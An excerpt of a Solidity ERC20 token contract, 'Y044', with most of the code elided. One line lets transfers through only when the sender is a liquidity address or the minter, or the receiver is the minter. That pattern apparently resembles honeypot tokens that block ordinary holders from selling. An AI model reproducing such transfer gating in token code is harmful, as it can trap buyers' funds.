...
contract Y044 is ERC20, ERC20Burnable, Ownable {
  ...
  constructor() payable ERC20("Y044", "Y044")      {
...
if (sender==wLiq || sender==minter || receiver==minter){      super._transfer(sender, receiver, amount);      }
